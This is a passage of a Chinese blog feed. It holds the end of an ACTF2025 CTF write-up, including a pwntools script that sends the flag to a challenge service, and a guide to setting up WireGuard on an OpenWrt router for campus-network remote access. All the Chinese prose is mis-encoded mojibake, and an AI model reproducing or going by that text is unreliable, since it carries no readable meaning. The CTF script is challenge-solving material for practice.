æ¥æ”¶å¹¶æ£€æŸ¥ &quot;Right!&quot; å“åº”</span><br>        response = conn.recvline().decode().strip()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Right!&quot;</span> <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-built_in">print</span>(response)<br>            <span class="hljs-comment"># æ¥æ”¶å¹¶å¤„ç† &quot;give me your data:&quot; æç¤º</span><br><span class="hljs-comment">#             data_prompt = conn.recvline().decode().strip()</span><br><span class="hljs-comment">#             print(data_prompt)</span><br><span class="hljs-comment">#             # è¿™é‡Œå¯ä»¥æ ¹æ®éœ€æ±‚å‘é€æ•°æ®ï¼Œå‡è®¾å‘é€ &quot;test_data&quot;</span><br>            conn.sendline(flag)<br>            <span class="hljs-comment"># æ¥æ”¶å¹¶æ‰“å°æœåŠ¡çš„æœ€ç»ˆå“åº”</span><br>            final_response = conn.recvall().decode()<br>            <span class="hljs-built_in">print</span>(final_response)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] No match found.&quot;</span>)<br><br><span class="hljs-comment"># å…³é—­è¿æ¥</span><br>conn.close()<br></code></pre></td></tr></table></figure><h1 id="master-of-movie"><a href="#master-of-movie" class="headerlink" title="master of movie"></a>master of movie</h1><p>æ ¹æ®ç‰‡æ®µæˆªå›¾æ‰¾å¯¹åº”çš„å½±ç‰‡çš„ IMDB å·ï¼Œç—›å¹¶å¿«ä¹ç€ï¼ˆå¹¶éå¿«ä¹</p><p>å¤§ä¼™ä¸€èµ·ç‹‚æ‰¾ï¼Œå¯æƒœçš„æ˜¯å› ä¸ºç­”æ¡ˆæ£€æµ‹ç¨‹åºé”™è¯¯ä¹‹ç±»çš„å¯¼è‡´æˆ‘ä»¬ç—›å¤±è¡€åˆ†</p><p>misc é¢˜çš„å›¾ç‰‡æ£€ç´¢è¦ç™¾åº¦ã€è°·æ­Œä¸¤ä¸ªæœç´¢å¼•æ“éƒ½å»è¯•è¯•ï¼Œæ­¤å¤–è¿˜æœ‰å°çº¢ä¹¦ç­‰ç­‰èƒ½æ ¹æ®å›¾ç‰‡æœç´¢çš„éƒ½ä¸è¦æ”¾è¿‡ã€‚</p><h1 id="å¯ä¾›å‚è€ƒå­¦ä¹ çš„-WP"><a href="#å¯ä¾›å‚è€ƒå­¦ä¹ çš„-WP" class="headerlink" title="å¯ä¾›å‚è€ƒå­¦ä¹ çš„ WP"></a>å¯ä¾›å‚è€ƒå­¦ä¹ çš„ WP</h1><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&mid=2247487421&idx=1&sn=ed4bac0ccc875fb6eca3a70225d8d9fd&chksm=ceca926109a3e9ec14ff9a17755af60b025442d576c501391907fd9fcf3e7e5ea35755da1783&mpshare=1&scene=23&srcid=0428kKjnTIimO6XRILncnTW6&sharer_shareinfo=b4dcd54a0c1ee949a798df6ea093020b&sharer_shareinfo_first=b4dcd54a0c1ee949a798df6ea093020b#rd">https://mp.weixin.qq.com/s?__biz&#x3D;Mzg4MTg1MDY4MQ&#x3D;&#x3D;&amp;mid&#x3D;2247487421&amp;idx&#x3D;1&amp;sn&#x3D;ed4bac0ccc875fb6eca3a70225d8d9fd&amp;chksm&#x3D;ceca926109a3e9ec14ff9a17755af60b025442d576c501391907fd9fcf3e7e5ea35755da1783&amp;mpshare&#x3D;1&amp;scene&#x3D;23&amp;srcid&#x3D;0428kKjnTIimO6XRILncnTW6&amp;sharer_shareinfo&#x3D;b4dcd54a0c1ee949a798df6ea093020b&amp;sharer_shareinfo_first&#x3D;b4dcd54a0c1ee949a798df6ea093020b#rd</a></p><p><a href="https://blog.xmcve.com/2025/04/27/ACTF2025-Writeup">https://blog.xmcve.com/2025/04/27/ACTF2025-Writeup</a></p><p>ç­‰</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>misc</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ ¡å›­ç½‘ç¯å¢ƒå†…çš„è¿œç¨‹è®¾å¤‡è¿æ¥å°è¯•</title>
    <link href="/2025/05/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/"/>
    <url>/2025/05/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="æ ¡å›­ç½‘ç¯å¢ƒå†…çš„è¿œç¨‹è®¾å¤‡è¿æ¥å°è¯•"><a href="#æ ¡å›­ç½‘ç¯å¢ƒå†…çš„è¿œç¨‹è®¾å¤‡è¿æ¥å°è¯•" class="headerlink" title="æ ¡å›­ç½‘ç¯å¢ƒå†…çš„è¿œç¨‹è®¾å¤‡è¿æ¥å°è¯•"></a>æ ¡å›­ç½‘ç¯å¢ƒå†…çš„è¿œç¨‹è®¾å¤‡è¿æ¥å°è¯•</h1><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™ä¸¤å¤©åœ¨æ€è€ƒå¦‚ä½•åœ¨å¯å®¤å±€åŸŸç½‘ä¹‹å¤–è¿œç¨‹è¿æ¥å¯å®¤è®¾å¤‡ï¼Œä»¥æ»¡è¶³æˆ‘æœ‰æ—¶å€™å‡ºé—¨ä¸æ–¹ä¾¿å¸¦ç”µè„‘æƒ³è¦ç”¨æ‰‹æœºè¿œç¨‹è¿æ¥ç”µè„‘æ“ä½œçš„éœ€æ±‚ã€‚æˆ‘é€‰å®šçš„æ˜¯ sunshine+moonlight ä¸²æµæ–¹æ¡ˆï¼Œç„¶è€Œè¯¥æ–¹æ¡ˆæœ¬èº«å¹¶ä¸æ”¯æŒè¿œç¨‹è¿æ¥ï¼Œåªé€‚ç”¨äºå±€åŸŸç½‘è¿æ¥ï¼Œæ‰€ä»¥æˆ‘éœ€è¦é€šè¿‡å†…ç½‘ç©¿é€è·å–ç”µè„‘ç½‘ç»œæœåŠ¡æˆ–ä½¿ç”¨ VPN <del>æ„å»ºè™šæ‹Ÿå±€åŸŸç½‘æ¥</del>è®©æˆ‘çš„ç”µè„‘å’Œæ‰‹æœºè®¾å¤‡å¤„äºåŒä¸€ä¸ªå±€åŸŸç½‘ç¯å¢ƒå†…ã€‚</p><h1 id="openVPN"><a href="#openVPN" class="headerlink" title="openVPN"></a>openVPN</h1><p>ç”±äº hdu åœ¨å»å¹´è¿›å…¥äº†å¤§å†…ç½‘æ—¶ä»£ï¼ˆå¯æ¶(ã€ƒï¼ çš¿ ï¼œ)ï¼‰ï¼Œç”Ÿæ´»åŒºçš„ç½‘ç»œå…¨éƒ¨å¹¶å…¥äº†æ ¡å›­ç½‘ï¼Œç”±å­¦æ ¡åˆ†é…åŠ¨æ€å†…ç½‘ ipã€‚æ‰€ä»¥å³ä¾¿æˆ‘æ‰‹å¤´æœ‰ä¸€ä¸ªåŸŸåæˆ‘ä¹Ÿæ²¡æ³•é€šè¿‡ DDNS ç›´æ¥ä½æˆæœ¬æ–¹ä¾¿åœ°å®ç°å¯¹å¯å®¤å±€åŸŸç½‘çš„è®¿é—®ã€‚</p><p>æˆ‘æ‰‹ä¸Šåˆšå¥½è¿˜æœ‰ä¸€ä¸ªäº‘æœåŠ¡å™¨ï¼Œä¹‹å‰ä½œä¸ºæŠ¤ç½‘çš„è·³æ¿æœºåˆåˆšå¥½æ­è¿‡ openVPN çš„æœåŠ¡ç«¯ï¼Œé‚£ä¹ˆæˆ‘æƒ³è¯•ç€å°è¯•é€šè¿‡ VPN æ¥è®©ä¸¤ä¸ªè®¾å¤‡å¤„äºåŒä¸€ä¸ª<del>è™šæ‹Ÿ</del>å±€åŸŸç½‘ä¸‹ã€‚ç¨å¾®ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼ŒåŠ ä¸Š client-to-client å…è®¸å®¢æˆ·ç«¯é—´é€šä¿¡ï¼Œç„¶ååœ¨ä¸¤ä¸ªè®¾å¤‡ä¸Šå‡ä½¿ç”¨ vpn æœåŠ¡ï¼ŒæˆåŠŸè¿æ¥ï¼</p><p>ç„¶è€Œæ•ˆæœä¸€è¨€éš¾å°½â€¦â€¦</p><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/YV7HbvxIjoBLDrxIjBBcVP8knhh.jpg"></p><p>æˆ–è®¸æ˜¯æœåŠ¡å™¨é…çš„å¸¦å®½å¤ªä½ã€åˆæ˜¯è¿œç¨‹è¿æ¥å¯¼è‡´è¿æ¥è´¨é‡ä¸å¥½ï¼Œæ€»ä¹‹æ”¾å¼ƒäº†è¿™ä¸ªæ–¹æ³•ï¼Œè§‰å¾—è¿˜æ˜¯æ»¡è¶³æ ¡å›­ç½‘å†…çš„è¿æ¥éœ€æ±‚å³å¯ã€‚</p><h1 id="WireGuard"><a href="#WireGuard" class="headerlink" title="WireGuard"></a>WireGuard</h1><p>éƒ½è¯´ wireguard æ˜¯æ›´åŠ é«˜æ€§èƒ½ã€å®‰å…¨ç¨³å®šçš„å·¥å…·ï¼Œé‚£ä¹ˆè¶è¿™ä¸ªæœºä¼šå°±å¯ä»¥æ¥è¯•è¯•ç”¨ã€‚åœ¨æ­¤ä¹‹å‰æˆ‘å…ˆæ£é¼“äº†ä¸€ä¸‹è·¯ç”±å™¨ï¼Œå°†è·¯ç”±å™¨åˆ·æˆ openwrt ç³»ç»Ÿï¼Œå‚è€ƒä¹‹å‰çš„ä¸€ç¯‡æ–‡ç« <a href="https://5i1encee.github.io/2025/04/21/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/">å°ç±³ AX3000T åˆ·æœº openwrt å°è®°</a>ï¼Œä¸€èˆ¬æ¥è¯´ openwrt è‡ªå¸¦ wireguardï¼Œä¸”åŸºæœ¬é€šè¿‡å›¾å½¢åŒ–ç•Œé¢æ“ä½œé…ç½®å³å¯ï¼Œæˆ‘å°†è·¯ç”±å™¨ä½œä¸ºæœåŠ¡ç«¯ç‚¹ï¼Œæ‰‹æœºç­‰ç§»åŠ¨è®¾å¤‡ä½œä¸ºå¯¹ç«¯èŠ‚ç‚¹æ¥å®ç°æˆ‘çš„ç›®æ ‡ã€‚</p><div class="note note-warning">            <p><strong>æ³¨æ„ï¼š</strong>ä»¥ä¸‹ openwrt ä¸Šçš„é…ç½®æ“ä½œå‡è¦è®°å¾—<strong>ä¿å­˜å¹¶åº”ç”¨</strong></p>          </div><h2 id="åˆ›å»ºå¯†é’¥å¯¹"><a href="#åˆ›å»ºå¯†é’¥å¯¹" class="headerlink" title="åˆ›å»ºå¯†é’¥å¯¹"></a>åˆ›å»ºå¯†é’¥å¯¹</h2><p>ssh è¿æ¥è·¯ç”±å™¨ <code>ssh root@192.168.1.1</code></p><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤åˆ†åˆ«ç”Ÿæˆä¸¤ç»„å¯†é’¥å¯¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#ç”ŸæˆæœåŠ¡ç«¯å…¬é’¥å’Œç§é’¥</span><br>wg genkey | <span class="hljs-built_in">tee</span> server_privatekey | wg pubkey &gt; server_publickey<br><span class="hljs-comment">#ç”Ÿæˆå¯¹ç«¯èŠ‚ç‚¹å…¬é’¥å’Œç§é’¥</span><br>wg genkey | <span class="hljs-built_in">tee</span> client_privatekey | wg pubkey &gt; client_publickey<br><span class="hljs-comment">#catä¸€ä¸ªä¸ªæŸ¥çœ‹å³å¯</span><br><span class="hljs-built_in">cat</span> server_privatekey<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆå…±äº«å¯†é’¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wg genpsk &gt; sharekey<br><span class="hljs-built_in">cat</span> sharekey<br></code></pre></td></tr></table></figure><p>è¿™äº›å¯†é’¥å¯¹å¯åœ¨è·¯ç”±å™¨ä¸Šæ¸…é™¤ä¼ è¾“è‡³ä¸»æœºä¿å­˜ã€‚å¦‚æœéœ€è¦å¤šä¸ªå¯¹ç«¯èŠ‚ç‚¹å°±è¦ç”Ÿæˆå¤šå¯¹å¯†é’¥å¯¹ï¼Œä¸èƒ½é‡å¤ä½¿ç”¨ï¼Œå…±äº«å¯†é’¥åˆ™æ‰€æœ‰å‡ä½¿ç”¨åŒä¸€ä¸ªã€‚</p><h2 id="åˆ›å»ºå¹¶é…ç½®æ¥å£"><a href="#åˆ›å»ºå¹¶é…ç½®æ¥å£" class="headerlink" title="åˆ›å»ºå¹¶é…ç½®æ¥å£"></a>åˆ›å»ºå¹¶é…ç½®æ¥å£</h2><p>å…ˆåˆ›å»ºæ–°çš„æ¥å£ï¼Œåè®®é€‰æ‹© WireGuard VPN</p><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/YDNUbzr9MoopWDx4cApc7CpxnCh.png"></p><p>ç„¶åé…ç½®è¯¥æ¥å£çš„å„ä¸ªå…³é”®é…ç½®</p><ul><li>ç§é’¥ï¼šä¸ºè·¯ç”±å™¨å‡†å¤‡çš„ç§é’¥</li><li>ç›‘å¬ç«¯å£ï¼šè·¯ç”±å™¨ä¸Šå°†ç»™ WireGuard ä½¿ç”¨çš„ç«¯å£</li><li>IP åœ°å€ï¼šè·¯ç”±å™¨åœ¨<del>è™šæ‹Ÿå±€åŸŸç½‘</del> VPN å†…çš„ ipï¼Œå¿…é¡»ä¸º IP-CIDR æ ¼å¼</li></ul><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/EpObbJ3o6oRyqhxQnkqcNl21nPg.png"></p><p>ä¸‹æ–¹â€œæ›´å¤šé€‰é¡¹â€å¤„å¯é€‰æ‹©â€œé¢„å…±äº«å¯†é’¥â€è¿›ä¸€æ­¥æé«˜å®‰å…¨æ€§</p><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/KP3AbYBiNoAPavxs06TclqETnu2.png"></p><p>æ·»åŠ  Peer å¹¶é…ç½®ä»¥ä¸‹å†…å®¹</p><ul><li>å…¬é’¥ï¼šä¸º Peer å‡†å¤‡çš„å…¬é’¥</li><li>é¢„å…±äº«å¯†é’¥ï¼ˆå¯é€‰ï¼‰ï¼šä¹‹å‰ç”Ÿæˆçš„</li><li>å…è®¸çš„ ipï¼šå…è®¸è¯¥ Peer åœ¨<del>è™šæ‹Ÿå±€åŸŸç½‘</del> VPN å†…ä½¿ç”¨çš„ ipï¼Œå¿…é¡»ä¸º IP-CIDR æ ¼å¼ï¼ˆæˆ‘æ­¤å¤„ä¸ä¸Šé¢è·¯ç”±å™¨åœ¨<del>è™šæ‹Ÿå±€åŸŸç½‘</del> VPN å†…çš„ ip å¤„äºåŒä¸€ç½‘æ®µã€‚ä¸è¦è¾“å…¥è·¯ç”±å™¨è‡ªèº«å±€åŸŸç½‘çš„ç½‘æ®µï¼Œå¦‚æˆ‘è¿™çš„ 192.168.1.0&#x2F;24 å°±ä¼šå‡ºç°é€»è¾‘é”™è¯¯ï¼‰</li><li>è·¯ç”±å…è®¸çš„ IPï¼šå‹¾é€‰å³å¯è®¿é—®è·¯ç”±å™¨ä¸Šçš„å…¶ä»–ç½‘æ®µï¼Œå¦‚æ­¤æˆ‘ä»¬æ‰èƒ½ä» Peer è®¿é—®åˆ°è·¯ç”±å™¨æœ¬èº«ä¸‹çš„å±€åŸŸç½‘</li><li>ç«¯ç‚¹ä¸»æœºï¼šæˆ‘çš„ Peer å³æ‰‹æœºæˆ–å…¶ä»–ç§»åŠ¨è®¾å¤‡ï¼Œæ²¡æœ‰å›ºå®šåŸŸåä»€ä¹ˆçš„ï¼Œç”¨ä¸ä¸Š</li><li>ç«¯ç‚¹ç«¯å£ï¼šæœ‰éœ€è¦å°±è®¾ç½®ï¼Œæˆ‘é»˜è®¤å³å¯</li><li>æŒç»­ Keep-Aliveï¼šé»˜è®¤æƒ…å†µä¸‹ï¼ŒWireGuard åœ¨ä¸ä½¿ç”¨æ—¶ä¼šå°½å¯èƒ½ä¿æŒé™é»˜ï¼Œä¸€èˆ¬è€Œè¨€æ²¡æœ‰é—®é¢˜ï¼Œä½†å½“å¯¹ç«¯å¤„äº Nat æˆ–é˜²ç«å¢™åæ—¶é•¿æ—¶é—´çš„é™é»˜å¯èƒ½å¯¼è‡´æ˜ å°„å¤±æ•ˆï¼Œæ‰€ä»¥å¯ä»¥è®¾ç½®æ¯éš”ä¸€æ®µæ—¶é—´å‘æœåŠ¡ç«¯ç‚¹å‘é€ä¿æŒæ´»åŠ¨çŠ¶æ€çš„æ•°æ®åŒ…æ¥ä¿æŒè¿æ¥çŠ¶æ€ã€‚æ ¡å›­ç½‘é‡Œæœ‰äº›æ—¶å€™ä¼šé‡åˆ°å¤„äº Nat ä¸‹çš„æƒ…å†µï¼Œæ‰€ä»¥ä¿é™©èµ·è§è®¾ä¸€ä¸‹ã€‚</li></ul><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/BFvbbKJfoon2qtxOhSHcZj8Knoj.png"></p><p>å°†ä»¥ä¸Šå‡ä¿å­˜å¹¶åº”ç”¨åæ¥å£é…ç½®ä¹Ÿå°±å®Œæˆäº†ã€‚å¦‚æœæœ‰å¤šä¸ªå¯¹ç«¯èŠ‚ç‚¹è®¾å¤‡åˆ™è¦é…ç½®å¤šä¸ª Peerï¼Œä¸èƒ½å…±åŒä½¿ç”¨ï¼Œä¼šé€ æˆ IP å†²çªç­‰é—®é¢˜ã€‚</p><div class="note note-warning">            <p><strong>æ³¨æ„ï¼š</strong>WireGuard çš„é…ç½®ä¿®æ”¹åæ˜¯éœ€è¦é‡å¯æ‰èƒ½ç”Ÿæ•ˆå¾—ï¼Œæ‰€ä»¥ä¿®æ”¹åè¿˜éœ€è®°å¾—ç‚¹å‡» <code>è¿æ¥</code> é‡æ–°å¯åŠ¨ä¸€ä¸‹</p>          </div><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/HNoCbSKF6o7rsExbiaqc1lcinzX.png"></p><h2 id="é…ç½®é˜²ç«å¢™"><a href="#é…ç½®é˜²ç«å¢™" class="headerlink" title="é…ç½®é˜²ç«å¢™"></a>é…ç½®é˜²ç«å¢™</h2><p>æ¥ä¸‹æ¥ä¸º WireGuard ä¸“é—¨é…ç½®ä¸€ä¸ªé˜²ç«å¢™è§„åˆ™ã€‚</p><p>å…ˆæ‰“å¼€é˜²ç«å¢™çš„é€šä¿¡è§„åˆ™</p><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/R3xbbhquIolf7Dx3ZLAcRh1lnYF.png"></p><p>åœ¨ä¸‹æ–¹â€œæ‰“å¼€è·¯ç”±å™¨ç«¯å£â€å¤„æ–°å¢è§„åˆ™ï¼Œå…è®¸ <code>TCP+UDP</code> åè®®ï¼ˆmoonlight+sunshine ä¸¤ä¸ªåè®®éƒ½è¦ç”¨ï¼‰å¹¶æŒ‡å®šå¯¹å¤–å¼€æ”¾çš„ç«¯å£ï¼ˆä¸ä¹‹å‰ WireGuard ç›‘å¬ç«¯å£é…ç½®ä¸€è‡´ï¼‰ï¼Œåªæœ‰è·¯ç”±å™¨è¿™ä¸ªå¯¹å¤–ç«¯å£å¼€æ”¾å WireGuard æœåŠ¡ç«¯ç‚¹æ‰èƒ½ä¸å¤–ç•Œå»ºç«‹è¿æ¥ã€‚</p><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/CRE3bPL8coxciPxU5rdc7Z5Ance.png"></p><p>è€Œåç‚¹å‡»ä¿®æ”¹è¿›è¡Œè¯¦ç»†é…ç½®ã€‚æºåŒºåŸŸé€‰æ‹© <code>wan</code> å£é˜²ç«å¢™ï¼Œç›®æ ‡åŒºåŸŸé€‰æ‹© <code>è®¾å¤‡ï¼ˆè¾“å…¥ï¼‰</code>ï¼Œå…¶ä»–æŒ‰éœ€è®¾ç½®</p><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/EAB8bJd43oCMPHx0pmdcRobYnod.png"></p><p>ä¿å­˜å¹¶åº”ç”¨åå»åˆ°é˜²ç«å¢™çš„å¸¸è§„è®¾ç½®ï¼Œä¸‹æ–¹ç‚¹å‡»æ·»åŠ ï¼Œä¸º WireGuard ä¸“é—¨é…ç½®ä¸€ä¸ªé˜²ç«å¢™è§„åˆ™ã€‚è½¬å‘è¦é€‰æ‹©æ¥å—ï¼Œè¦†ç›–ç½‘ç»œé€‰æ‹©ä¹‹å‰é…å¥½çš„ WireGuard æ¥å£ï¼Œè¿™æ ·è¿™ä¸ªé˜²ç«å¢™è§„åˆ™å°±åº”ç”¨åˆ°é‚£ä¸ªæ¥å£ä¸Šå»äº†ã€‚å…è®¸è½¬å‘ç›®æ ‡åŒºåŸŸé€‰æ‹© <code>lan</code> å£é˜²ç«å¢™å’Œ <code>wan</code> å£é˜²ç«å¢™ï¼Œå…è®¸è½¬å‘æºåŒºåŸŸé€‰æ‹© <code>lan</code> å£é˜²ç«å¢™ï¼Œè¿™æ ·ä¸€æ¥æ¥è‡ª WireGuard çš„æµé‡å°±å¯ä»¥å»å¾€ wan å£å‘å¤–ç•Œè®¾å¤‡ä¼ è¾“ï¼Œå»å¾€ lan å£å‘å¯å®¤å±€åŸŸç½‘è®¾å¤‡ä¼ è¾“ï¼Œæ¥è‡ªå¯å®¤å±€åŸŸç½‘è®¾å¤‡çš„ lan å£æµé‡å°±å¯ä»¥å»å¾€ WireGuard å‘å¯¹ç«¯èŠ‚ç‚¹è®¾å¤‡ä¼ è¾“ã€‚</p><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/VrANbcKbQopBXJxwno2capQVnrc.png"></p><p>æœ€åä¿å­˜å¹¶åº”ç”¨å®Œæˆé˜²ç«å¢™é…ç½®</p><h2 id="å¯¹ç«¯-WireGuard-é…ç½®"><a href="#å¯¹ç«¯-WireGuard-é…ç½®" class="headerlink" title="å¯¹ç«¯ WireGuard é…ç½®"></a>å¯¹ç«¯ WireGuard é…ç½®</h2><p>åœ¨å¯¹ç«¯ï¼ˆæ‰‹æœºï¼‰ä¸‹è½½ WireGuardï¼Œæ‰‹åŠ¨åˆ›å»ºéš§é“</p><ul><li>æœ¬åœ°ç§é’¥ï¼šä¸º Peer å‡†å¤‡çš„ç§é’¥</li><li>æœ¬åœ°å…¬é’¥ï¼šæ­¤å¤„ä¸å¿…ç†ä¼šï¼Œå¡«å…¥ä¸Šé¢çš„ç§é’¥åè‡ªåŠ¨å°±å‡ºæ¥äº†ï¼Œè·Ÿä¹‹å‰è·¯ç”±å™¨ä¸Šç”Ÿæˆçš„æ˜¯ä¸€æ ·çš„</li><li>å±€åŸŸç½‘ IP åœ°å€ï¼šæœ¬è®¾å¤‡åœ¨<del>è™šæ‹Ÿå±€åŸŸç½‘</del> VPN å†…çš„ IPï¼Œå¿…é¡»ä¸º IP-CIDR æ ¼å¼ï¼Œè¦å±äºè·¯ç”±å™¨ä¸Šé…ç½®çš„ <code>å…è®¸çš„ip</code></li><li>DNS æœåŠ¡å™¨ï¼šéšæ„è®¾ç½®å³å¯ï¼Œè¿™ä¸ªåœºæ™¯ä¸å¤ªéœ€è¦</li><li>è¿œç¨‹å…¬é’¥ï¼šä¸ºè·¯ç”±å™¨å‡†å¤‡çš„å…¬é’¥</li><li>é¢„å…±äº«å¯†é’¥ï¼ˆå¯é€‰ï¼‰ï¼šä¹‹å‰ç”Ÿæˆçš„</li><li>è¿æ¥ä¿æ´»é—´éš”ï¼šè‡ªè¡Œé€‰æ‹©</li><li>å¯¹ç«¯ï¼ˆç›¸å¯¹äºæ‰‹æœºæœ¬æœºæ¥è¯´ï¼‰ï¼šå½“å‰è®¾å¤‡æ‰€å¤„ç½‘ç»œç¯å¢ƒä¸‹èƒ½è®¿é—®åˆ°çš„å¦ä¸€ç«¯çš„ ipï¼Œæ­¤å¤„å³æ ¡å›­ç½‘å¤§å†…ç½‘ç¯å¢ƒä¸‹å¯å®¤è·¯ç”±å™¨è¢« DHCP åˆ†é…åˆ°çš„å†…ç½‘ IPã€‚ï¼ˆç»è¿‡æµ‹è¯•ï¼Œå½“ä¸‹ hdu æ•™å­¦åŒºçš„æ ¡å›­ç½‘ä¸ç”Ÿæ´»åŒºçš„æ ¡å›­ç½‘åŸºæœ¬ç›¸é€šï¼Œç”±äºæˆ‘åªè¦æ±‚åœ¨æ ¡å›­ç½‘å†…ä½¿ç”¨ï¼Œæ‰€ä»¥å¡«å†™å†…ç½‘ IP åœ¨è¿æ¥æ ¡å›­ WiFi çš„æƒ…å†µä¸‹ä½¿ç”¨å³å¯ï¼‰æ³¨æ„éœ€å¸¦ä¸Šå‰é¢è®¾ç½®çš„å¼€æ”¾ç«¯å£å·ï¼Œ<code>ip:port</code></li><li>è·¯ç”±çš„ IP åœ°å€ï¼ˆæ®µï¼‰ï¼šå¦ä¸€ç«¯è®¾å¤‡æ‰€å¤„çš„ç½‘æ®µï¼Œå‰é¢è·¯ç”±å™¨è®¾ç½®çš„æ˜¯ 192.168.2.1ï¼ˆ<del>è™šæ‹Ÿå±€åŸŸç½‘</del> VPN å†…ï¼‰å’Œ 192.168.1.1ï¼ˆæœ¬èº«å±€åŸŸç½‘å†…ï¼‰ï¼Œé‚£ä¹ˆå¡«å…¥ 192.168.2.1&#x2F;24 å’Œ 192.168.1.1&#x2F;24 ä¹Ÿå°±æ˜¯åœ¨è®¿é—®è¿™ä¸¤ä¸ªç½‘æ®µæ—¶å°†é€šè¿‡ WireGuard çš„è§„åˆ™é€šä¿¡ï¼Œå°†å½“å‰è®¾å¤‡â€œå¹¶å…¥â€å¦ä¸€ç«¯è®¾å¤‡ï¼ˆå¯å®¤è·¯ç”±å™¨ï¼‰çš„å±€åŸŸç½‘ç»œ</li></ul><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/J71AbzyAXoEwCMxbP6dcYOsInFb.png"></p><p>é…ç½®å®Œæˆåå¼€å¯ï¼Œåœ¨æ¥å£å¤„ç‚¹å‡»è¿æ¥å¹¶æŸ¥çœ‹ï¼Œè‹¥å‡ºç°æ¥æ”¶ã€å‘é€æµé‡é‚£åŸºæœ¬å°±å…¨éƒ¨é…ç½®æˆåŠŸäº†ã€‚</p><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/Pj1qbqnIwok5SMxwZCTc3ZTunjh.png"></p><h2 id="é…ç½®-moonlight"><a href="#é…ç½®-moonlight" class="headerlink" title="é…ç½® moonlight"></a>é…ç½® 